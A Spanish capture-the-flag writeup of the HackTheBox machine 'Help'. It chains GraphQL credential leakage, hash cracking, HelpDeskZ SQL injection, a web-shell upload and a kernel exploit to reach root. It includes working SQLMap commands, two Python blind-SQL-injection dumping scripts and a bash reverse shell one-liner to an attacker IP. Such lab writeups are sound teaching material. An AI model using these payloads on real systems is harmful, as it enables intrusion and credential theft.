@@ -1,0 +1,516 @@
+---
+title: "Help"
+date: 2025-05-29 16:41:30 +0200
+categories: writeups HackTheBox
+tags: inyecciónsql python scripting vuln_kernel máquina criptografía graphql helpdeskz linux
+description: Writeup de la máquina Help de Hackthebox.
+image: ../assets/images/posts/logos/hackthebox.png
+---
+## Reconocimiento
+
+En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:
+
+```bash
+openvpn lab_trr0r.opvn
+```
+
+Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250108222138.png>)
+
+> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.10.121`.
+### Nmap
+
+En segundo lugar, realizaremos un escaneo usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.
+
+```bash
+nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.10.121 -oG allPorts
+```
+
+Observamos como nos reporta que se encuentran abiertos los puertos **22, 80 y 3000**.
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250108222300.png>)
+
+
+Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.
+
+A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.
+
+```bash
+nmap -p22,80,3000 -sCV 10.10.10.121 -oN targeted
+```
+
+Lo más interesante que podemos ver la captura de **Nmap** es que existe un dominio **help.htb**:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250108222328.png>)
+___
+## Explotación
+
+Si intentamos acceder a la página web veremos que nos redirige a **help.htb** tal y como nos ha reportado **Nmap**, para solucionar este problema añadiremos la siguiente línea al `/etc/hosts`:
+
+```bash
+10.10.10.121 help.htb
+```
+
+Gracias al **Virtual Hosting** podemos ver correctamente la página web en la cual nos encontraremos con la página por defecto de apache, si revisamos el código fuente tampoco veremos nada interesante:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250108231737.png>)
+### GraphQL
+
+Como no hemos encontrado nada interesante nos pasaremos al puerto **3000** y observaremos que en ella está alojada una **HTTP API** la cual nos muestra el siguiente mensaje:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109001005.png>)
+
+Intentaremos acceder a **/graphql** para comprobar si está instalado este lenguaje usado para interactuar con la **API** y veremos que nos dice que falta la **query**:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109001105.png>)
+
+En primer lugar probaremos a enumerar la **API** usando el lenguaje ****GraphQL**** gracias al uso del parámetro **query**, en definitiva debemos de realizar la siguiente consulta:
+
+```bash
+curl -s -X POST http://help.htb:3000/graphql -H 'Content-Type: application/json' -d '{"query": "{__schema{types{name}}}"}' | jq
+```
+
+Observamos que conseguimos enumerar los tipos existentes y el que más nos llama la atención es **User**:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109001326.png>)
+
+Ayudándonos de **ChatGPT** conseguiremos ver los campos presentes en el tipo **User**, es decir gracias a la siguiente consulta:
+
+```bash
+curl -s -X POST http://help.htb:3000/graphql -H 'Content-Type: application/json' -d '{"query": "{__type(name: \"User\"){fields {name type {name }}}}"}' | jq
+```
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109001822.png>)
+
+Una vez conocemos los campos pasaremos a la última parte, conocer el valor de dichos campos para ello ejecutaremos el siguiente comando: 
+
+```bash
+curl -s -X POST http://help.htb:3000/graphql -H 'Content-Type: application/json' -d '{"query": "{User{username,password}}"}' | jq
+```
+
+Observamos como nos dice que el campo **User** no existe y además nos sugiere el campo **user** :
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109001922.png>)
+
+Realizaremos la misma consulta de antes pero en vez de usar el tipo **User** usaremos **user**:
+
+```bash
+curl -s -X POST http://help.htb:3000/graphql -H 'Content-Type: application/json' -d '{"query": "{user{username,password}}"}' | jq
+```
+
+Observamos como nos devuelve un nombre de usuario y una contraseña hasheada en **MD5** ya que tiene **32** caracteres:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109001936.png>)
+
+En este punto lo que haremos será mirar el modo de hash correspondiente a **MD5**, para ello usaremos el siguiente comando y tal y como vemos a continuación el modo de hash es **0**.
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109002344.png>)
+
+Una vez que sabemos el modo de hash podemos proceder con el ataque de fuerza bruta gracias al siguiente comando: 
+
+```bash
+hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt
+```
+
+>Otras opciones válidas para crackear el **hash** son las siguientes herramientas **web**:
+> - Herramienta web que lo detecta automáticamente: [Crackstation](https://crackstation.net/).
+> - Herramienta web que lo detecta automáticamente: [hashes.com](https://hashes.com/en/decrypt/hash).
+
+Observamos que el hash crackeado es **godhelpmeplz**:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109002210.png>)
+
+Como ya no tenemos que hacer nada más en el puerto **3000** pasaremos a realizar fuzzing con **Gobuster** sobre el puerto **80** tal que así:
+
+```bash
+gobuster dir -u http://help.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js
+```
+
+Observamos como nos descubre el directorio **/support**:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250108231817.png>)
+
+
+Al acceder a dicho directorio veremos que está alojado el servicio **HelpDeskZ**:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250108231859.png>)
+### Way 1 - SQL Injection
+
+Buscaremos en **searchsploit** algún exploit correspondiente a este servicio y vemos que existen dos exploits para la versión **1.0.2**, pero en este caso nos quedaremos con el segundo exploit en el cual se explota **SQL Injection** estando **autenticado**:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250110233744.png>)
+
+Como no tenemos forma de saber la versión del servicio probaremos el exploit, para ello nos lo descargaremos con **searchsploit** (`searchsploit -m php/webapps/41200.py`).
+
+Antes de ejecutar el exploit leeremos los comentarios y veremos que nos indica que debemos de realizar unos pasos previos:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250110234355.png>)
+
+Iniciaremos sesión con las credenciales encontradas en el **GraphQL** y enviaremos un ticket que ha de contener un archivo adjunto, es decir tal que así: 
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250110235315.png>)
+
+En este punto lo que haremos será ejecutar el exploit con los parámetros correspondientes pero veremos que no funciona correctamente, por lo que haremos será probar la **SQL Injection** de manera manual.
+
+Mirando el código del exploit nos daremos cuenta que la **SQL Injection** se acontece en la siguiente ruta:
+
+```http
+http://127.0.0.1/helpdeskz/?/?v=view_tickets&action=ticket&param[]=2(VALID_TICKET_ID_HERE)&param[]=attachment&param[]=1&param[]=1 or id>0 -- -
+```
+
+Para llegar a la **URL** donde se acontece la **SQL Injection** hemos de dirigirnos al archivo adjunto de nuestro ticket:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250110235911.png>)
+
+Capturaremos la petición con **FoxyProxy** y **BurpSuite**, la enviaremos al **Repeater** para probar mejor la **SQL Injection** y realizaremos la siguiente consulta:
+
+```http
+/support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=1&param[]=7+and+1=1--+- 
+```
+
+Observaremos que nos devuelve el código fuente de la imagen:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250111000133.png>)
+
+Volveremos a realizar la petición pero cambiaremos la **SQL Injection**, es decir finalmente quedará tal que así:
+
+```http
+/support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=1&param[]=7+and+1=2--+- 
+```
+
+Observamos como ahora no nos devuelve el código fuente de la página por lo que tenemos una forma de enumerar la base de datos gracias a una **Inyección SQL basada en booleanos**:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250111000146.png>)
+#### Automatizada - SQLMap
+
+Gracias a **BurpSuite** guardaremos la anterior petición en un fichero con la opción **Copy to File**.
+##### Bases de Datos
+
+Una vez que tenemos en un fichero la petición usaremos **SQLMap** de la siguiente forma para sacar las bases de datos:
+
+```bash
+sqlmap -r req.req -p "param[]" --dbs --level 5 --risk 3 --batch
+```
+
+Observamos que la única base de datos relevante es **support**:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250111003446.png>)
+##### Tablas de la base de datos support
+
+En este punto lo que haremos será extraer las tablas de dicha base datos usando la siguiente instrucción:
+
+```bash
+sqlmap -r req.req -p "param[]" -D support --tables --level 5 --risk 3 --batch
+```
+
+Observamos que entre todas las tablas las más interesantes son **users** y **staff**:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250111003509.png>)
+##### Información de la tabla users
+
+Para mostrar los datos de la tabla **users** ejecutaremos el siguiente comando: 
+
+```bash
+sqlmap -r req.req -p "param[]" -D support -T users --dump --level 5 --risk 3 --batch
+```
+
+Observamos como nos devuelve un montón de usuarios:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250111004510.png>)
+##### Información de la tabla staff
+
+Antes de empezar a crackear las anteriores contraseñas mostraremos la información de la tabla **staff** de la siguiente forma:
+
+```bash
+sqlmap -r req.req -p "param[]" -D support -T staff -C username,password --dump --level 5 --risk 3 --batch
+```
+
+Observaremos que existe el usuario **admin** con la contraseña **Welcome1** por lo que probaremos a autenticarnos vía **SSH - TCP 22**.
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250111004536.png>)
+#### Manual - Python Script
+
+> *Destacar que en el caso de que queramos que vaya más rápido debemos de usar hilos pero por ahora lo dejaremos como están.*
+##### Basada en booleanos
+
+El script de python el cual nos ayuda a dumpear toda la información de la base de datos gracias a la **Inyección SQL basada en booleanos** es el siguiente:
+
+```python
+#!/usr/bin/env python3
+
+# Author: Álvaro Bernal (aka. trr0r)
+
+import requests, string
+from pwn import *
+
+main_url = "http://help.htb/support/"
+
+cookies = {'PHPSESSID': 'sbndaj4mg10l6ukiia1s4l3817'}
+
+caracteres = string.printable
+
+# Iremos seleccionado un número según la información que deseamos extraer.
+sql_inyection = [
+    # 0 - Current database
+    '6 and ascii(substr(database(),{},1))={}-- -',
+
+    # 1 - All databases
+    '6 and ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))={}-- -',
+    
+    # 2 - Table from a database
+    '6 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="support"),{},1))={}-- -',
+    
+    # 3 - Columns from a table (users)
+    '6 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema="support" and table_name="users"),{},1))={}-- -',
+    
+    # 4 - Dump information from a table (users)
+    '6 and ascii(substr((select group_concat(fullname,0x3a,password) from users),{},1))={}-- -',
+    
+    # 5 - Dump information from a table (staff)
+    '6 and ascii(substr((select group_concat(username,0x3a,password) from staff),{},1))={}-- -'
+]
+
+def main():
+
+    cadena = ""
+    pos_caracter = 1
+    finished = False
+
+    p1 = log.progress("Fueza Bruta")
+    p1.status("Iniciando proceso de fuerza bruta")
+
+    p2 = log.progress("Datos extraÃ­dos")
+
+    while True:
+
+        if finished:
+            break
+
+        for caracter in caracteres:
+            ascii_value = ord(caracter)
+
+            # http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6
+            values = {
+                'v' : 'view_tickets', 
+                'action' : 'ticket', 
+                'param[]' : ['4', 'attachment', '1', sql_inyection[5].format(pos_caracter, ascii_value)]
+            }
+
+            response = requests.get(main_url, params=values, cookies=cookies)
+
+            if not "404" in response.text:
+                cadena += caracter
+                p2.status(cadena)
+                pos_caracter += 1
+                break
+
+            if ascii_value == 126:
+
+                finished = True
+                break
+
+    p2.success(cadena)
+
+
+
+if __name__ == '__main__':
+
+    main()
+```
+##### Basada en tiempo
+
+El script de python el cual nos ayuda a dumpear toda la información de la base de datos gracias a la **Inyección SQL basada en tiempo** es el siguiente:
+
+```python
+#!/usr/bin/env python3
+
+# Author: Álvaro Bernal (aka.trr0r)
+
+import requests, string
+from pwn import *
+import time
+
+main_url = "http://help.htb/support/"
+
+cookies = {'PHPSESSID': 'sbndaj4mg10l6ukiia1s4l3817'}
+
+caracteres = string.printable
+
+# Iremos seleccionado un número según la información que deseamos extraer.
+sql_inyection = [
+    # 0 - Current database
+    '6 and if(ascii(substr((select database()),{},1))={}, sleep(0.20),1)-- -',
+
+    # 1 - All databases
+    '6 and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))={}, sleep(0.20),1)-- -',
+    
+    # 2 - Table from a databasoe
+    '6 and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = "support"),{},1))={}, sleep(0.20),1)-- -',
+    
+    # 3 - Columns from a table (users)
+    '6 and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema = "support" and table_name = "users"),{},1))={}, sleep(0.20),1)-- -',
+    
+    # 4 - Dump information from a table (users)
+    '6 and if(ascii(substr((select group_concat(fullname,0x3a,password) from users),{},1))={}, sleep(0.20),1)-- -',
+    
+    # 5 - Dump information from a table (staff)
+    '6 and if(ascii(substr((select group_concat(username,0x3a,password) from staff),{},1))={}, sleep(0.20),1)-- -'
+]
+
+def main():
+
+    cadena = ""
+    pos_caracter = 1
+    finished = False
+
+    p1 = log.progress("Fueza Bruta")
+    p1.status("Iniciando proceso de fuerza bruta")
+
+    p2 = log.progress("Datos extraÃ­dos")
+
+    while True:
+
+        if finished:
+            break
+
+        for caracter in caracteres:
+            ascii_value = ord(caracter)
+
+            # http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6
+            values = {
+                'v' : 'view_tickets', 
+                'action' : 'ticket', 
+                'param[]' : ['4', 'attachment', '1', sql_inyection[5].format(pos_caracter, ascii_value)]
+            }
+
+            time_start = time.time()
+            response = requests.get(main_url, params=values, cookies=cookies)
+            time_end = time.time()
+
+            if time_end - time_start > 0.20:
+                cadena += caracter
+                p2.status(cadena)
+                pos_caracter += 1
+                break
+
+            if ascii_value == 126:
+
+                finished = True
+                break
+    p2.success(cadena)
+
+
+
+if __name__ == '__main__':
+
+    main()
+```
+#### SSH - TCP 22
+
+Probaremos a conectarnos vía **ssh** con diferentes usuarios: **admin**, **root**, **helpme**, **help**, pero tal y como vemos a continuación el que nos funcionará será este último (**help**):
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250111004849.png>)
+
+Una vez que hemos ganado acceso a la máquina víctima procederemos con la **Escalada de privilegios**.
+### Way 2 - File Upload
+
+Como bien hemos visto antes existían dos exploits para la versión **1.0.2** por lo que una vez hemos comprobado que es vulnerable a la **SQL Injection** lo más seguro es que el otro exploit también lo sea por lo que probaremos a subir un archivo para tener ejecución remota de comandos (**RCE**):
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250108235131.png>)
+
+Nos descargaremos el anterior el exploit (`searchsploit -m php/webapps/40300.py`) pero antes de ejecutarlo leeremos los comentarios del exploit los cuales nos indican el repositorio de GitHub donde podemos ver el código fuente vulnerable. Además los comentarios nos detallan los pasos a seguir antes de ejecutar el exploit:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250108235407.png>)
+
+Intentaremos acceder a dicho repositorio pero veremos que ya no se encuentra disponible por lo que no seremos capaces de ver el código vulnerable.
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250108235727.png>)
+
+Tras leer el código entenderemos el funcionamiento del exploit el cual sea basa en descubrir el nombre del fichero que adjuntamos en un ticket pues este se está guardando de la siguiente forma la cual es insegura:
+
+```php
+# El fichero se almacena en una ruta que no sabemos.
+# El nombre del fichero es su nombre hasheado en md5 + el tiempo actual y finalmente le concatenamos su extensión.
+$filename = md5($_FILES['attachment']['name'] . time()). "." .$ext;
+```
+
+Una vez que sabemos como funciona el exploit debemos descubrir la ruta donde se está almacenando el fichero que subimos, por lo que realizaremos fuzzing de directorios usando **Gobuster** de la siguiente forma: 
+
+```bash
+gobuster dir -u http://help.htb/support/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+```
+
+Observamos que existe un directorio **/uploads**:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109000011.png>)
+
+En este punto lo más normal sería ejecutar el exploit y darnos cuenta de que no funciona por lo que intuiremos de que existe otro subdirectorio dentro de **uploads**, para comprobar esto volveremos a realizar fuzzing con **Gobuster** de la siguiente forma: 
+
+```bash
+gobuster dir -u http://help.htb/support/uploads/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+```
+
+Observamos como efectivamente existen más subdirectorios dentro de **uploads** por lo que probaremos con ambos y nos quedaremos con el que funcione, en primer lugar usaremos el de **/tickets** pues es el más lógico ya que estamos subiendo un fichero adjunto en nuestro ticket:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109000041.png>)
+
+Una vez que sabemos la ruta donde posiblemente se está almacenando nuestro fichero enviaremos un ticket con el **cmd.php** como fichero adjunto, es decir tal que así:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109000224.png>)
+
+Veremos como nos salta un mensaje de error alertándonos de que no podemos subir el fichero (**cmd.php**) pero hemos de ignorarlo.
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109000237.png>)
+
+Finalmente, ejecutaremos el **exploit** pasándole los parámetros correspondientes de la siguiente forma: 
+
+```bash
+python2 helpdeskz_exploit.py http://help.htb/support/uploads/tickets/ cmd.php
+```
+
+Observamos como nos encuentra la ruta donde ha sido subido nuestro **cmd.php**:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109000309.png>)
+
+Accederemos a dicha ruta y comprobaremos que tenemos ejecución remota de comando sobre la máquina víctima:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109000331.png>)
+
+En este punto lo que haremos será ponernos en escucha con **NetCat** (`nc -nvlp 443`) y enviarnos una **Reverse Shell** gracias al típico one liner de bash (`bash -c "bash -i >%26 /dev/tcp/10.10.14.21/443 0>%261"`).
+
+Observamos como recibimos correctamente la **Reverse Shell** por lo que procederemos con la **Escalada de privilegios**.
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109000440.png>)
+___
+## Escalada de privilegios
+
+> En el caso de que hayamos ganado acceso a la máquina víctima a través de una **Reverse Shell** deberemos de realizar un **Tratamiento de la TTY** y si hemos ganado acceso a través de **ssh** debemos de hacer un `export TERM=xterm` para que nos funcione el <kbd>CTRL</kbd> + <kbd>L</kbd> (**clear**).
+
+Tras ganar acceso a la máquina víctima buscaremos diferentes formas de elevar nuestros privilegios, empezaremos por las más típicas (**Sudoers**, **SUID**) pero no encontraremos nada. Pero al mirar la versión del **kernel** nos daremos cuenta que es bastante antigua por lo que podremos probar una **Explotación en el Kernel**.
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109000532.png>)
+
+Buscaremos en **searchsploit** por esta versión del **kernel** (**4.4.0-116**) y nos daremos cuenta que existen dos exploits para la versión de Ubuntu **16.04**.
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109000636.png>)
+
+Antes de descargarnos los exploits miraremos nuestra versión (`lsb_release -a`) y tal y como vemos a continuación es la **16.04**:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109000648.png>)
+
+Una vez que hemos comprobado que los exploits son vulnerables para nuestra versión de **kernel** y **distribución** nos los descagaremos `searchsploit -m <nomnbre>.py` y luego nos los **transferimos** a la máquina víctima.
+
+Una vez tenemos los exploits en el máquina en la máquina víctima ejecutaremos lo siguiente para compilar el primer exploit:
+
+```bash
+gcc kernel_exploit.c -o kernel_exploit
+```
+
+Observamos como al ejecutar dicho exploit nos convertiremos en el usuario **root**.
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109000802.png>)
+
+De igual forma compilaremos el segundo exploit y nos daremos cuenta que también conseguimos convertirnos en **root**:
+
+![](<../assets/images/posts/2025-05-29-help/Pasted image 20250109000923.png>)
